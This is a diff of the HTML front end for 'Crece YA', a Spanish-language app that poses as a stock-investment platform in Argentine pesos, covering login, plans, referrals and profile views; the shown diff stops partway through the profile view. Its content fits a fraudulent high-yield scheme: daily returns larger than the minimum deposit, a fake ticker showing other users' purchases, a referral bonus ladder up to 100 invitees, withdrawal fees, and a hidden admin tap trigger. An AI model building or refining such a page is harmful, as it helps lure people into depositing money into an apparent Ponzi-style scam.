@@ -4,250 +4,148 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Crece YA - Inversiones Bursátiles</title>
-  
-  <!-- Soporte App Móvil PWA -->
-  <meta name="theme-color" content="#030a13">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-  <meta name="apple-mobile-web-app-title" content="Crece YA">
-  <link rel="apple-touch-icon" href="./logo.png">
-
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
-
   <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  
   <style>
     body {
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif !important;
-      font-size: 14.5px;
       touch-action: manipulation;
       -webkit-tap-highlight-color: transparent;
-      transition: background-color 0.3s ease, color 0.3s ease;
-    }
-
-    body.dark-mode {
-      background-color: #030a13 !important;
-      color: #e2e8f0 !important;
-    }
-    body.dark-mode main {
-      background-color: #081322 !important;
-      border-color: #162a45 !important;
-    }
-    body.dark-mode header,
-    body.dark-mode nav {
-      background-color: rgba(8, 19, 34, 0.95) !important;
-      border-color: #162a45 !important;
-    }
-    body.dark-mode .card-theme {
-      background-color: #0e1e33 !important;
-      border-color: #1e3657 !important;
-      color: #f1f5f9 !important;
-    }
-    body.dark-mode .subbox-theme {
-      background-color: #132742 !important;
-      border-color: #203e66 !important;
-    }
-    body.dark-mode .text-main {
-      color: #f8fafc !important;
-    }
-    body.dark-mode .text-sub {
-      color: #94a3b8 !important;
-    }
-    body.dark-mode .nav-btn-inactive {
-      background-color: #0e1e33 !important;
-      color: #94a3b8 !important;
-    }
-    body.dark-mode .social-ticker {
-      background-color: #0c1a2d !important;
-      border-color: #1a3252 !important;
-      color: #94a3b8 !important;
     }
   </style>
 </head>
-<body class="bg-[#bae6fd] text-slate-850 antialiased min-h-screen p-0 sm:p-4 flex justify-center selection:bg-sky-500 selection:text-white">
+<body class="bg-[#bae6fd] text-slate-850 font-sans antialiased min-h-screen p-0 sm:p-4 flex justify-center selection:bg-sky-500 selection:text-white">
 
-  <!-- AVISO OFICIAL CRECE YA -->
-  <div id="notice-modal" class="fixed inset-0 z-50 bg-[#020813]/85 backdrop-blur-md hidden flex items-center justify-center p-4">
-    <div class="card-theme bg-white border border-sky-300 w-full max-w-sm rounded-3xl p-6 shadow-2xl space-y-4 text-slate-850 relative">
-      <div class="text-center space-y-2">
-        <div class="inline-flex items-center justify-center w-14 h-14 rounded-2xl bg-sky-100 border border-sky-200 text-sky-600 text-2xl shadow-xs">
-          <i class="fa-solid fa-bullhorn"></i>
-        </div>
-        <h3 class="text-base font-black tracking-wide text-slate-900 text-main">AVISO OFICIAL CRECE YA</h3>
-      </div>
-
-      <div class="subbox-theme bg-slate-50 border border-sky-100 rounded-2xl p-4 space-y-2.5 text-xs font-mono">
-        <div class="flex items-center gap-2.5">
-          <span class="text-base shrink-0">🔥</span>
-          <p><strong class="text-amber-500">Plan MELI:</strong> $2.500 ARS diarios</p>
-        </div>
-        <div class="flex items-center gap-2.5">
-          <span class="text-base shrink-0">⏱️</span>
-          <p><strong class="text-sky-600">Duración ágil:</strong> 2 días de ciclo</p>
-        </div>
-        <div class="flex items-center gap-2.5">
-          <span class="text-base shrink-0">💵</span>
-          <p><strong class="text-emerald-600">Depósito mínimo:</strong> $2.000 ARS</p>
-        </div>
-        <div class="flex items-center gap-2.5">
-          <span class="text-base shrink-0">🎁</span>
-          <p><strong class="text-amber-600">Check-in diario:</strong> +$500 ARS / día</p>
-        </div>
-        <div class="flex items-center gap-2.5">
-          <span class="text-base shrink-0">👥</span>
-          <p><strong class="text-sky-700">Bono por invitados:</strong> Desde +$1.000 ARS</p>
-        </div>
-        <div class="flex items-center gap-2.5">
-          <span class="text-base shrink-0">🏛️</span>
-          <p><strong class="text-slate-600 text-sub">Horario bancario:</strong> Lun a Vie 07:00 a 18:00 hs</p>
-        </div>
-      </div>
-
-      <button onclick="closeNoticeModal()" class="w-full py-3 bg-sky-500 hover:bg-sky-400 text-slate-950 font-black text-xs rounded-xl transition shadow-md cursor-pointer">
-        ENTENDIDO / OK
-      </button>
+  <!-- ================= SPLASH SCREEN INICIAL ================= -->
+  <div id="splash-screen" onclick="this.remove()" class="fixed inset-0 z-[60] bg-[#e0f2fe] flex flex-col items-center justify-center transition-opacity duration-500 select-none cursor-pointer">
+    <div class="text-center space-y-3">
+      <img src="./logo.png" onerror="this.style.display='none'" alt="Crece YA" class="h-28 w-auto mx-auto object-contain drop-shadow-md animate-pulse">
+      <p class="text-xs font-mono font-bold text-sky-800 tracking-wider">CARGANDO MERCADO...</p>
+      <span class="text-[10px] text-sky-600 block">(Toca la pantalla si no avanza)</span>
     </div>
   </div>
 
-  <!-- PANTALLA DE ACCESO CON CASILLA DE INVITACIÓN VISIBLE -->
-  <div id="auth-screen" style="position: fixed; inset: 0; z-index: 9999; background-color: rgba(6, 20, 36, 0.98); display: flex; align-items: center; justify-content: center; padding: 1rem;">
-    <div class="w-full max-w-sm bg-[#0b1b2d] border border-sky-900/60 rounded-3xl p-6 shadow-2xl space-y-4 text-white">
+  <!-- ================= PANTALLA DE REGISTRO / LOGIN ================= -->
+  <div id="auth-screen" class="fixed inset-0 z-50 bg-[#061424]/90 backdrop-blur-md flex items-center justify-center p-4">
+    <div class="w-full max-w-sm bg-[#0b1b2d] border border-sky-900/60 rounded-3xl p-5 shadow-2xl space-y-4 text-white">
       <div class="text-center space-y-2">
-        <img src="./logo.png" alt="Crece YA" class="h-16 w-auto mx-auto object-contain">
-        <h2 class="text-xl font-black tracking-wider pt-0.5">CRECE YA</h2>
-        <p class="text-xs text-sky-300/80">Acceso Seguro a la Plataforma Bursátil</p>
+        <img src="./logo.png" onerror="this.style.display='none'" alt="Crece YA" class="h-16 w-auto mx-auto object-contain">
+        <h2 class="text-base font-extrabold tracking-wider pt-0.5">CRECE YA</h2>
+        <p class="text-[11px] text-sky-300/80">Acceso Seguro a la Plataforma Bursátil</p>
       </div>
 
-      <div class="grid grid-cols-2 p-1 bg-[#13283f] rounded-xl text-xs font-bold">
-        <button id="tab-auth-register" type="button" onclick="setAuthMode('register')" class="py-2 rounded-lg bg-sky-500 text-slate-950 transition cursor-pointer">
-          Registrarse
-        </button>
-        <button id="tab-auth-login" type="button" onclick="setAuthMode('login')" class="py-2 rounded-lg text-slate-400 hover:text-white transition cursor-pointer">
-          Iniciar Sesión
-        </button>
+      <div class="grid grid-cols-2 p-1 bg-[#13283f] rounded-xl text-xs font-bold mb-2">
+        <button id="auth-tab-btn-login" onclick="setAuthMode('login')" class="py-1.5 rounded-lg bg-sky-500 text-slate-950 transition">Iniciar Sesión</button>
+        <button id="auth-tab-btn-reg" onclick="setAuthMode('reg')" class="py-1.5 rounded-lg text-slate-400 hover:text-white transition">Registrarse</button>
       </div>
 
-      <div class="space-y-3">
+      <form id="auth-form" class="space-y-2.5">
         <div>
-          <label class="text-xs text-slate-400 block mb-1">NÚMERO DE TELÉFONO / WHATSAPP</label>
-          <div class="flex items-center bg-[#13283f] border border-sky-800/60 rounded-xl px-3 py-2.5 text-sm">
+          <label class="text-[10px] text-slate-400 block mb-0.5">NÚMERO DE TELÉFONO / WHATSAPP</label>
+          <div class="flex items-center bg-[#13283f] border border-sky-800/60 rounded-xl px-3 py-2 text-xs">
             <i class="fa-solid fa-phone text-sky-400 mr-2"></i>
-            <input id="auth-phone" type="tel" placeholder="+54 9 11 1234-5678" class="bg-transparent text-white w-full outline-none font-mono">
+            <input id="auth-phone" type="tel" required placeholder="+54 9 11 1234-5678" class="bg-transparent text-white w-full outline-none font-mono">
           </div>
         </div>
 
         <div>
-          <label class="text-xs text-slate-400 block mb-1">CONTRASEÑA</label>
-          <div class="flex items-center bg-[#13283f] border border-sky-800/60 rounded-xl px-3 py-2.5 text-sm">
+          <label class="text-[10px] text-slate-400 block mb-0.5">CONTRASEÑA</label>
+          <div class="flex items-center bg-[#13283f] border border-sky-800/60 rounded-xl px-3 py-2 text-xs">
             <i class="fa-solid fa-lock text-sky-400 mr-2"></i>
-            <input id="auth-pass" type="password" placeholder="Ingresa tu contraseña" class="bg-transparent text-white w-full outline-none font-mono">
-            <button type="button" onclick="togglePassView('auth-pass', this)" class="text-slate-400 hover:text-white ml-2 text-xs cursor-pointer">
-              <i class="fa-solid fa-eye"></i>
-            </button>
+            <input id="auth-pass" type="password" required placeholder="Ingresa tu contraseña" class="bg-transparent text-white w-full outline-none font-mono">
           </div>
         </div>
 
-        <div id="auth-confirm-box">
-          <label class="text-xs text-slate-400 block mb-1">CONFIRMAR CONTRASEÑA</label>
-          <div class="flex items-center bg-[#13283f] border border-sky-800/60 rounded-xl px-3 py-2.5 text-sm">
-            <i class="fa-solid fa-lock-open text-sky-400 mr-2"></i>
-            <input id="auth-pass-confirm" type="password" placeholder="Repite tu contraseña" class="bg-transparent text-white w-full outline-none font-mono">
-          </div>
-        </div>
-
-        <div id="auth-ref-box">
-          <label class="text-xs text-slate-400 block mb-1">TELÉFONO DE QUIEN TE INVITÓ (OPCIONAL)</label>
-          <div class="flex items-center bg-[#13283f] border border-sky-800/60 rounded-xl px-3 py-2.5 text-sm">
-            <i class="fa-solid fa-user-plus text-sky-400 mr-2"></i>
-            <input id="auth-ref-input" type="tel" placeholder="Ej: 1124743560" class="bg-transparent text-white w-full outline-none font-mono text-xs">
-          </div>
-        </div>
-
-        <div id="auth-captcha-box">
-          <label class="text-xs text-slate-400 block mb-1">CÓDIGO DE SEGURIDAD</label>
-          <div class="grid grid-cols-2 gap-2">
-            <div class="flex items-center justify-between bg-[#081320] border border-sky-800/80 rounded-xl px-3 py-2">
-              <span id="captcha-code-display" class="font-mono text-lg font-black tracking-widest text-amber-400 select-none">4821</span>
-              <button type="button" onclick="generateCaptcha()" class="text-slate-400 hover:text-white text-sm cursor-pointer">
-                <i class="fa-solid fa-rotate-right"></i>
-              </button>
+        <div id="auth-reg-extra" class="hidden space-y-2.5">
+          <div>
+            <label class="text-[10px] text-slate-400 block mb-0.5">CONFIRMAR CONTRASEÑA</label>
+            <div class="flex items-center bg-[#13283f] border border-sky-800/60 rounded-xl px-3 py-2 text-xs">
+              <i class="fa-solid fa-lock-open text-sky-400 mr-2"></i>
+              <input id="auth-pass-confirm" type="password" placeholder="Repite tu contraseña" class="bg-transparent text-white w-full outline-none font-mono">
             </div>
-            <input id="auth-captcha-input" type="text" maxlength="4" placeholder="Código" class="bg-[#13283f] border border-sky-800/60 rounded-xl px-3 py-2 text-center text-sm font-mono font-bold text-white outline-none">
+          </div>
+
+          <div>
+            <label class="text-[10px] text-slate-400 block mb-0.5">CÓDIGO DE SEGURIDAD</label>
+            <div class="grid grid-cols-2 gap-2">
+              <div class="flex items-center justify-between bg-[#081320] border border-sky-800/80 rounded-xl px-3 py-1.5">
+                <span id="captcha-code-display" class="font-mono text-base font-black tracking-widest text-amber-400 select-none">4821</span>
+                <button type="button" onclick="generateCaptcha()" class="text-slate-400 hover:text-white text-xs">
+                  <i class="fa-solid fa-rotate-right"></i>
+                </button>
+              </div>
+              <input id="auth-captcha-input" type="text" maxlength="4" placeholder="Código" class="bg-[#13283f] border border-sky-800/60 rounded-xl px-3 py-1.5 text-center text-xs font-mono font-bold text-white outline-none">
+            </div>
           </div>
         </div>
 
-        <button type="button" id="btn-submit-auth" onclick="handleAuthSubmit()" class="w-full py-3 bg-sky-500 hover:bg-sky-400 active:scale-95 text-slate-950 font-black text-sm rounded-xl transition shadow-lg mt-2 cursor-pointer">
+        <button type="submit" id="btn-auth-submit" class="w-full py-2.5 bg-sky-500 hover:bg-sky-400 text-slate-950 font-black text-xs rounded-xl transition shadow-lg mt-2">
           Ingresar al Mercado
         </button>
-      </div>
+      </form>
     </div>
   </div>
 
-  <!-- APLICACIÓN CENTRAL -->
+  <!-- ================= APLICACIÓN CENTRAL ================= -->
   <main class="w-full max-w-sm bg-[#e0f2fe] border-x sm:border border-sky-200 min-h-screen sm:rounded-3xl shadow-2xl flex flex-col justify-between relative pb-20">
 
     <div>
-      <header class="p-3.5 flex items-center justify-between border-b border-sky-200/80 bg-white/70 backdrop-blur-md sticky top-0 z-30">
-        <div class="flex items-center gap-2.5 cursor-pointer select-none" id="admin-logo-trigger">
-          <img src="./logo.png" alt="Crece YA" class="h-9 w-auto object-contain">
+      <!-- HEADER CON DETECTOR ADMIN (4 TOQUES) -->
+      <header class="p-3 flex items-center justify-between border-b border-sky-200/80 bg-white/70 backdrop-blur-md sticky top-0 z-30">
+        <div class="flex items-center gap-2 cursor-pointer select-none" id="admin-logo-trigger">
+          <img src="./logo.png" onerror="this.style.display='none'" alt="Crece YA" class="h-9 w-auto object-contain">
           <div>
-            <span class="font-black tracking-wider text-slate-900 text-sm block leading-none text-main">CRECE YA</span>
-            <span id="user-display-phone" class="text-[11px] text-sky-700 font-mono font-medium">+54 9 11 ...</span>
+            <span class="font-extrabold tracking-wider text-slate-900 text-xs block leading-none">CRECE YA</span>
+            <span id="user-display-phone" class="text-[9px] text-sky-700 font-mono font-medium">+54 9 11 ...</span>
           </div>
         </div>
 
         <div class="flex items-center gap-2">
-          <button id="btn-theme-toggle" onclick="toggleTheme()" class="w-8 h-8 rounded-xl bg-sky-100 dark:bg-slate-800 text-slate-700 dark:text-amber-300 border border-sky-300 dark:border-slate-700 flex items-center justify-center text-sm shadow-xs transition cursor-pointer" title="Cambiar tema">
-            <i id="theme-icon" class="fa-solid fa-moon"></i>
-          </button>
-
-          <span class="text-xs bg-sky-100 text-sky-800 border border-sky-300 px-2 py-0.5 rounded-full font-bold font-mono">
+          <span class="text-[10px] bg-sky-100 text-sky-800 border border-sky-300 px-2 py-0.5 rounded-full font-bold font-mono">
             EN LÍNEA ✓
           </span>
-          <button id="btn-logout" title="Cerrar sesión" class="text-slate-400 hover:text-rose-500 text-sm px-1 cursor-pointer">
+          <button id="btn-logout" title="Cerrar sesión" class="text-slate-400 hover:text-rose-500 text-xs px-1">
             <i class="fa-solid fa-arrow-right-from-bracket"></i>
           </button>
         </div>
       </header>
 
-      <section class="social-ticker bg-white/60 border-b border-sky-200/60 px-3 py-2 text-xs text-slate-600">
-        <p class="truncate font-mono text-xs flex items-center gap-2">
+      <!-- NOTIFICACIÓN SOCIAL PROOF -->
+      <section class="bg-white/60 border-b border-sky-200/60 px-3 py-1.5 text-xs text-slate-600">
+        <p class="truncate font-mono text-[11px] flex items-center gap-1.5">
           <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
           <span id="toast-social-text">Usuario +54 9 35... activó Spotify ($8.000 ARS)</span>
         </p>
       </section>
 
-      <!-- VISTA 1: PLANES -->
-      <div id="view-planes" class="space-y-4 p-3.5">
-        <div class="card-theme p-4 rounded-2xl bg-white border border-sky-200 shadow-sm relative overflow-hidden">
+      <!-- ================= VISTA 1: PLANES ================= -->
+      <div id="view-planes" class="space-y-3.5 p-3">
+        <div class="p-4 rounded-2xl bg-white border border-sky-200 shadow-sm relative overflow-hidden">
           <div class="flex items-center justify-between">
-            <span class="text-xs text-slate-500 font-medium text-sub">Saldo Disponible</span>
-            <span class="text-xs bg-sky-50 text-sky-700 border border-sky-200 px-2 py-0.5 rounded-md font-mono font-bold">100% Pesos ARS</span>
+            <span class="text-xs text-slate-500 font-medium">Saldo Disponible</span>
+            <span class="text-[10px] bg-sky-50 text-sky-700 border border-sky-200 px-2 py-0.5 rounded-md font-mono font-bold">100% Pesos ARS</span>
           </div>
-          <h1 id="home-balance-display" class="text-3xl font-black text-slate-900 mt-1 font-mono tracking-tight text-main">$0 <span class="text-sm font-normal text-slate-400">ARS</span></h1>
-          <p class="text-xs text-slate-500 mt-0.5 font-mono text-sub">Mín. retiro: $5.000 ARS (Comisión administrativa 10%)</p>
+          <h1 id="home-balance-display" class="text-3xl font-extrabold text-slate-900 mt-1 font-mono tracking-tight">$0 <span class="text-xs font-normal text-slate-400">ARS</span></h1>
+          <p class="text-[11px] text-slate-500 mt-0.5 font-mono">Mín. retiro: $5.000 ARS (Comisión administrativa 10%)</p>
 
           <div class="grid grid-cols-2 gap-2 mt-3.5">
-            <button onclick="openWalletModal('recargar')" class="bg-sky-600 hover:bg-sky-700 text-white font-black py-2.5 rounded-xl text-xs transition shadow flex items-center justify-center gap-1.5 cursor-pointer">
+            <button onclick="openWalletModal('recargar')" class="bg-sky-600 hover:bg-sky-700 text-white font-extrabold py-2.5 rounded-xl text-xs transition shadow flex items-center justify-center gap-1.5">
               <i class="fa-solid fa-plus"></i> Cargar Saldo
             </button>
-            <button onclick="openWalletModal('retirar')" class="bg-sky-800 hover:bg-sky-900 text-white font-black py-2.5 rounded-xl text-xs transition shadow flex items-center justify-center gap-1.5 cursor-pointer">
+            <button onclick="openWalletModal('retirar')" class="bg-sky-800 hover:bg-sky-900 text-white font-extrabold py-2.5 rounded-xl text-xs transition shadow flex items-center justify-center gap-1.5">
               <i class="fa-solid fa-arrow-up-right-from-square"></i> Retirar
             </button>
           </div>
         </div>
 
         <div class="flex items-center justify-between px-1">
-          <span class="text-xs font-bold text-slate-800 uppercase tracking-wide text-main">MERCADO BURSÁTIL</span>
-          <div class="subbox-theme flex gap-1 bg-white/70 p-1 rounded-xl border border-sky-200 text-xs">
-            <button id="btn-tab-iniciales" class="px-3 py-1 rounded-lg font-bold bg-sky-600 text-white transition cursor-pointer">
+          <span class="text-xs font-bold text-slate-800 uppercase tracking-wide">MERCADO BURSÁTIL</span>
+          <div class="flex gap-1 bg-white/70 p-1 rounded-xl border border-sky-200 text-[11px]">
+            <button id="btn-tab-iniciales" class="px-2.5 py-1 rounded-lg font-bold bg-sky-600 text-white transition">
               Iniciales
             </button>
-            <button id="btn-tab-pro" class="px-3 py-1 rounded-lg font-semibold text-slate-600 hover:text-slate-900 transition cursor-pointer">
-              VIP
+            <button id="btn-tab-pro" class="px-2.5 py-1 rounded-lg font-semibold text-slate-600 hover:text-slate-900 transition">
+              Pro / VIP
             </button>
           </div>
         </div>
@@ -255,413 +153,340 @@
         <div id="plans-container" class="space-y-3"></div>
       </div>
 
-      <!-- VISTA 2: PRODUCTOS -->
-      <div id="view-productos" class="hidden p-3.5 space-y-3">
-        <div class="card-theme p-3.5 bg-white/80 border border-sky-200 rounded-2xl">
-          <h2 class="text-xs font-bold text-slate-850 uppercase tracking-wide flex items-center gap-1.5 text-main">
+      <!-- ================= VISTA 2: PRODUCTOS ================= -->
+      <div id="view-productos" class="hidden p-3 space-y-3">
+        <div class="p-3 bg-white/80 border border-sky-200 rounded-2xl">
+          <h2 class="text-xs font-bold text-slate-850 uppercase tracking-wide flex items-center gap-1.5">
             <i class="fa-solid fa-box-open text-sky-600"></i> Tus Acciones Adquiridas
           </h2>
-          <p class="text-xs text-slate-500 mt-0.5 font-mono text-sub">El capital y los dividendos se acreditan automáticamente al culminar el ciclo.</p>
+          <p class="text-[11px] text-slate-500 mt-0.5 font-mono">El capital y los dividendos se acreditan al culminar el reloj en vivo.</p>
         </div>
-        <div id="active-products-container" class="space-y-3"></div>
+        <div id="active-products-container" class="space-y-2.5"></div>
       </div>
 
-      <!-- VISTA 3: COMPARTIR (ESCALA LIMPIA) -->
-      <div id="view-compartir" class="hidden p-3.5 space-y-4">
-        <div class="card-theme p-4 bg-white border border-sky-200 rounded-2xl shadow-sm space-y-3">
-          <div class="flex items-center gap-2.5">
-            <div class="w-9 h-9 rounded-xl bg-sky-100 text-sky-600 flex items-center justify-center text-base">
+      <!-- ================= VISTA 3: COMPARTIR ================= -->
+      <div id="view-compartir" class="hidden p-3 space-y-3.5">
+        <div class="p-4 bg-white border border-sky-200 rounded-2xl shadow-sm space-y-3">
+          <div class="flex items-center gap-2">
+            <div class="w-8 h-8 rounded-xl bg-sky-100 text-sky-600 flex items-center justify-center text-sm">
               <i class="fa-solid fa-share-nodes"></i>
             </div>
             <div>
-              <h2 class="text-sm font-bold text-slate-900 text-main">Tu Enlace de Invitación</h2>
-              <span class="text-xs text-slate-500 font-mono text-sub">Gana comisiones al validar su primer depósito</span>
+              <h2 class="text-xs font-bold text-slate-900">Tu Enlace de Invitación</h2>
+              <span class="text-[10px] text-slate-500 font-mono">Gana comisiones al validar su primer depósito</span>
             </div>
           </div>
 
-          <div class="subbox-theme flex items-center bg-slate-50 border border-sky-200 rounded-xl px-3 py-2 gap-2">
+          <div class="flex items-center bg-slate-50 border border-sky-200 rounded-xl px-2.5 py-2 gap-2">
             <input id="ref-link-input" type="text" readonly class="bg-transparent text-xs text-sky-800 font-mono w-full outline-none select-all truncate">
-            <button id="btn-copy-ref" class="px-3 py-1 bg-sky-600 hover:bg-sky-700 text-white text-xs font-bold rounded-lg transition shrink-0 cursor-pointer">
+            <button id="btn-copy-ref" class="px-3 py-1 bg-sky-600 hover:bg-sky-700 text-white text-xs font-bold rounded-lg transition shrink-0">
               Copiar
             </button>
           </div>
 
-          <button id="btn-share-whatsapp" class="w-full py-2.5 bg-emerald-500 hover:bg-emerald-600 text-slate-950 font-black text-xs rounded-xl transition shadow flex items-center justify-center gap-2 cursor-pointer">
-            <i class="fa-brands fa-whatsapp text-base"></i> Compartir en WhatsApp
+          <button id="btn-share-whatsapp" class="w-full py-2.5 bg-emerald-500 hover:bg-emerald-600 text-slate-950 font-extrabold text-xs rounded-xl transition shadow flex items-center justify-center gap-2">
+            <i class="fa-brands fa-whatsapp text-sm"></i> Compartir en WhatsApp
           </button>
         </div>
 
-        <div class="p-3.5 bg-amber-50 dark:bg-amber-950/40 border border-amber-200 dark:border-amber-800/50 rounded-2xl text-xs text-amber-900 dark:text-amber-200 leading-relaxed space-y-1">
+        <div class="p-3 bg-amber-50 border border-amber-200 rounded-2xl text-[11px] text-amber-900 leading-relaxed space-y-1">
           <p class="font-bold flex items-center gap-1.5">
             <i class="fa-solid fa-shield-halved text-amber-600"></i> Aviso de Seguridad:
           </p>
           <p>Un usuario se registra como Oficial tras concretar su primer depósito ($2.000 ARS). Las bonificaciones se liberan de forma automática.</p>
         </div>
 
-        <div class="card-theme p-3.5 bg-white border border-sky-200 rounded-2xl space-y-2.5">
-          <div class="flex justify-between items-center">
-            <h3 class="text-xs font-bold text-slate-850 uppercase tracking-wide text-main">Tus Invitados Registrados</h3>
-            <span id="invites-count-badge" class="text-[10px] font-mono bg-sky-100 text-sky-800 border border-sky-200 px-2 py-0.5 rounded-full font-bold">0 en tu red</span>
-          </div>
-          <div id="invites-list-container" class="space-y-1.5 text-xs font-mono">
-            <p class="text-slate-400 text-center py-3 text-sub">Consultando tu red de invitados...</p>
+        <div class="p-3.5 bg-white border border-sky-200 rounded-2xl space-y-2">
+          <h3 class="text-xs font-bold text-slate-850 uppercase tracking-wide">Escala de Bonificaciones</h3>
+          <div class="grid grid-cols-2 gap-2 text-xs font-mono">
+            <div class="p-2 rounded-xl bg-slate-50 border border-slate-100">1 Invitado: <strong class="text-sky-700">+$1.000 ARS</strong></div>
+            <div class="p-2 rounded-xl bg-slate-50 border border-slate-100">3 Invitados: <strong class="text-sky-700">+$2.000 ARS</strong></div>
+            <div class="p-2 rounded-xl bg-slate-50 border border-slate-100">5 Invitados: <strong class="text-sky-700">+$4.000 ARS</strong></div>
+            <div class="p-2 rounded-xl bg-slate-50 border border-slate-100">10 Invitados: <strong class="text-sky-700">+$8.000 ARS</strong></div>
+            <div class="p-2 rounded-xl bg-slate-50 border border-slate-100">20 Invitados: <strong class="text-sky-700">+$15.000 ARS</strong></div>
+            <div class="p-2 rounded-xl bg-slate-50 border border-slate-100">40 Invitados: <strong class="text-sky-700">+$30.000 ARS</strong></div>
+            <div class="p-2 rounded-xl bg-slate-50 border border-slate-100">50 Invitados: <strong class="text-sky-700">+$60.000 ARS</strong></div>
+            <div class="p-2 rounded-xl bg-slate-50 border border-slate-100">100 Invitados: <strong class="text-sky-700">+$100.000 ARS</strong></div>
           </div>
         </div>
 
-        <div class="card-theme p-3.5 bg-white border border-sky-200 rounded-2xl space-y-2.5">
-          <h3 class="text-xs font-bold text-slate-850 uppercase tracking-wide text-main">Escala de Bonificaciones</h3>
-          <div class="grid grid-cols-2 gap-2 text-xs font-mono">
-            <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">1 Invitado: <strong class="text-sky-700">+$1.000 ARS</strong></div>
-            <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">3 Invitados: <strong class="text-sky-700">+$2.000 ARS</strong></div>
-            <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">5 Invitados: <strong class="text-sky-700">+$4.000 ARS</strong></div>
-            <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">10 Invitados: <strong class="text-sky-700">+$8.000 ARS</strong></div>
-            <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">20 Invitados: <strong class="text-sky-700">+$15.000 ARS</strong></div>
-            <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">40 Invitados: <strong class="text-sky-700">+$30.000 ARS</strong></div>
-            <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">50 Invitados: <strong class="text-sky-700">+$60.000 ARS</strong></div>
-            <div class="subbox-theme p-2.5 rounded-xl bg-slate-50 border border-slate-100">100 Invitados: <strong class="text-sky-700">+$100.000 ARS</strong></div>
+        <div class="p-3.5 bg-white border border-sky-200 rounded-2xl space-y-2.5">
+          <div class="flex justify-between items-center">
+            <h3 class="text-xs font-bold text-slate-800">Personas Invitadas</h3>
+            <span id="invites-count-badge" class="text-[10px] font-mono bg-sky-100 text-sky-800 px-2 py-0.5 rounded-md font-bold">0 registrados</span>
+          </div>
+          <div id="invites-list-container" class="space-y-1.5 text-xs font-mono">
+            <p class="text-slate-400 text-center py-2 text-[11px]">Aún no tienes invitados en tu red.</p>
           </div>
         </div>
       </div>
 
-      <!-- VISTA 4: MI PERFIL -->
-      <div id="view-perfil" class="hidden p-3.5 space-y-4">
-        <div class="card-theme p-4 bg-white border border-sky-200 rounded-2xl shadow-sm space-y-3">
+      <!-- ================= VISTA 4: MI PERFIL ================= -->
+      <div id="view-perfil" class="hidden p-3 space-y-3.5">
+        <div class="p-4 bg-white border border-sky-200 rounded-2xl shadow-sm space-y-3">
           <div class="flex justify-between items-center">
-            <span class="text-xs font-semibold text-slate-500 text-sub">Resumen de Cuenta</span>
-            <span class="text-xs font-mono bg-emerald-50 text-emerald-700 border border-emerald-200 px-2 py-0.5 rounded-full font-bold">Activo</span>
+            <span class="text-xs font-semibold text-slate-500">Resumen de Cuenta</span>
+            <span class="text-[10px] font-mono bg-emerald-50 text-emerald-700 border border-emerald-200 px-2 py-0.5 rounded-full font-bold">Activo</span>
           </div>
 
           <div class="grid grid-cols-3 gap-2 text-center font-mono">
-            <div class="subbox-theme p-2.5 bg-slate-50 rounded-xl border border-slate-100">
-              <span class="text-[10px] text-slate-400 block text-sub">DISPONIBLE</span>
-              <strong id="profile-bal-ars" class="text-xs text-slate-900 font-bold text-main">$0</strong>
+            <div class="p-2 bg-slate-50 rounded-xl border border-slate-100">
+              <span class="text-[9px] text-slate-400 block">DISPONIBLE</span>
+              <strong id="profile-bal-ars" class="text-xs text-slate-900 font-bold">$0</strong>
             </div>
-            <div class="subbox-theme p-2.5 bg-slate-50 rounded-xl border border-slate-100">
-              <span class="text-[10px] text-slate-400 block text-sub">EN REVISIÓN</span>
-              <strong id="profile-pending-ars" class="text-xs text-amber-600 font-bold text-main">$0</strong>
+            <div class="p-2 bg-slate-50 rounded-xl border border-slate-100">
+              <span class="text-[9px] text-slate-400 block">EN REVISIÓN</span>
+              <strong id="profile-pending-ars" class="text-xs text-amber-600 font-bold">$0</strong>
             </div>
-            <div class="subbox-theme p-2.5 bg-slate-50 rounded-xl border border-slate-100">
-              <span class="text-[10px] text-slate-400 block text-sub">RETIRADO</span>
-              <strong id="profile-withdrawn-ars" class="text-xs text-sky-700 font-bold text-main">$0</strong>
+            <div class="p-2 bg-slate-50 rounded-xl border border-slate-100">
+              <span class="text-[9px] text-slate-400 block">RETIRADO</span>
+              <strong id="profile-withdrawn-ars" class="text-xs text-sky-700 font-bold">$0</strong>
             </div>
           </div>
         </div>
 
-        <!-- TARJETA DINÁMICA DE RETIRO EN PROCESO -->
-        <div id="active-withdraw-box" class="hidden p-3.5 bg-sky-900/40 border border-sky-500/40 rounded-2xl space-y-1 text-xs font-mono">
-          <div class="flex justify-between items-center">
-            <span class="font-bold text-sky-300">Solicitud de Retiro en Proceso</span>
-            <span class="text-[10px] bg-amber-400/20 text-amber-300 px-2 py-0.5 rounded-full font-bold">Horario Bancario</span>
-          </div>
-          <p id="active-withdraw-text" class="text-slate-300">Neto: $0 ARS hacia tu cuenta</p>
-          <span class="text-[10px] text-slate-400 block">Liquidaciones de Lun a Vie de 07:00 a 18:00 hs</span>
-        </div>
-
-        <div class="card-theme p-3.5 bg-white border border-sky-200 rounded-2xl flex items-center justify-between shadow-xs">
+        <div class="p-3 bg-white border border-sky-200 rounded-2xl flex items-center justify-between shadow-xs">
           <div class="flex items-center gap-2.5">
-            <div class="w-10 h-10 rounded-xl bg-amber-400/20 text-amber-600 flex items-center justify-center text-lg font-bold">
+            <div class="w-9 h-9 rounded-xl bg-amber-400/20 text-amber-600 flex items-center justify-center text-sm font-bold">
